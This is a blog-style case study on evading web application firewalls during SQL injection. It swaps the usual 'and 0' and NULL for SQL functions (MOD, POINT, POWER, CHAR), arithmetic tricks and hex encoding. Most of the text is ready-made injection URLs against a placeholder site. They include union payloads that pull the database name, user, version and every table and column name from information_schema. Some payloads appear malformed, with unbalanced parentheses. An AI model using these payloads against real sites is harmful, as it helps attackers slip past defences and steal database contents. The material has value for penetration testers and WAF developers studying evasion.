---
title: Case study on SQL Injection WAF bypassing via SQL Functions
updated: 2021-09-05 13:55
---

## The traditional way using And 0

The ordinary usage of And 0 is easily detected by WAF and instantly triggers it, so it becomes impossible to use that query. The examples below describes the traditional way of using an false value in SQL Injection.

```
And 1=0
And false
And 0
And 1
And 50=60
Any number that are not the same will equal to (0, false, null)
```

## The alternative way of using And 0

The following methods are newly discovered queries which are supported by it’s respective SQL, as a new way of declaring false, null or 0 value(s).

1) Any **Mathematical/Arithmetic** or **Logical Problem** that equal to 0

```
And 1*0
And 1-1
And 0/1
```
For example:  
http://website.com/index.php?id=1’ and 1*0 order by 10--

2) Using **MOD()**

```
SELECT mod(10, 2);
```

The used mod() Function will output to 0

For example:  
http://website.com/index.php?id=1 and mod(29,9) Order by 10--

3) Using **POINT()**

```
SELECT point(29, 9);
```
For example:  
http://website.com/index.php?id=1 and point(29,9) Order by 10--

4) Using **POWER()**

```
SELECT power(5,5);
```
For example:  
http://website.com/index.php?id=1 and power(5,5) Order by 10--

## Illegal parameter data types

Error notification Illegal parameter data types INT and row for operation '=', is related to the data type of column included in the condition. The problem can occur because of many reasons.

1) For operation **MOD**
```
% = Modulo
```
For example:
http://website.com/index.php?id=1 % point(29,9) Order by 10--

2) For operation **&**
```
& = Bitwise And
&& = Logical And
```
For example:  
http://website.com/index.php?id=1 && point(29,9) Order by 10--

3) For operation **OR**
```
| = Bitwise OR
|| = Logical OR, sometimes use for Concatanation
```
For example:  
http://website.com/index.php?id=1 || point(29,9) Order by 10--

## The traditional way of using Null

The ordinary usage of Null is easily detected by WAF and instantly triggers it, so it becomes impossible to use that query. The examples below describes the traditional way of using an false value in SQL Injection.
```
Union Select null, null, null, null
```

## The alternative way of using Null

1) Using **0**
```
UNION SELECT 0,0,0,0
```
For example:  
http://website.com/index.php?id=1 div **0** Union Select **0**,**0**,**0**,**0** (SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),**0**,**0**--+"

2) Using **false**
```
UNION SELECT false,false,false,false
```
For example:  
http://website.com/index.php?id=1 div **false** Union Select **false**,**false**,**false**,**false**,SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),**false**--+

3) Using **char()**
```
UNION SELECT char(null),char(null),char(null),char(null)
UNION SELECT char(false),char(false,char(false),char(false)
UNION SELECT char(0),char(0),char(0),char(0)
UNION SELECT char(0x4e554c4c),char(0x4e554c4c),char(0x4e554c4c),char(0x4e554c4c)
```
For example:  
http://website.com/index.php?id=1 div **char(false)** Union Select "**char(false)** div **char(false)** Union Select **char(false)**,**char(false)**,**char(false)**,**char(false)**,concat(0x222f3e,0x3c62723e,0x3c62723e,'<br>','Database :: ',database(),0x3c62723e,'User ::',user(),0x3c62723e,'Version ::',version(),0x3c62723e,user(),make_set(6,@:=0x0a, (select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),**char(false)**--+",**char(false)**,**char(false)**,**char(false)**,**char(false)**,**char(false)**--+

4) Using **Arithmetic** or **Logical Operator**
```
UNION SELECT (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)
UNION SELECT 34=35,34=35,34=35,34=35
```
For example:  
```
http://website.com/index.php?id=1 div (0*1337-0) Union Select "(0*1337-0) div (0*1337-0) Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0),concat(0x222f3e,0x3c62723e,0x3c62723e,'<br>','Database ::',database(),0x3c62723e,'User :: ',user(),0x3c62723e,'Version ::',version(),0x3c62723e,user(),make_set(6,@:=0x0a, (select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),0x3c62723e),(0*1337-0)--+",(0*1337-0),(0*1337-0), (0*1337-0),(0*1337-0),(0*1337-0)--+
```

## Bypassing Static Web Application Firewall with 0xHEX values

Since 0xHEX values are accepted and widely used in SQL Queries and Injection payloads, it is a great way to bypass static-based Firewalls. Using this technique, it is possible to avoid using words such as **NULL**, **false**, or ‘ (single quotes). Below are existing payload, but their respective values are converted to 0xHEX format.

```
SELECT CHAR(NULL); → SELECT CHAR(0x4e554c4c);
SELECT CHAR(0) → SELECT CHAR(0x30);
SELECT MOD(29, 9); → SELECT MOD(0x3239, 0x34);
SELECT POINT(29, 9); → SELECT POINT(0x3239, 0x39);
```
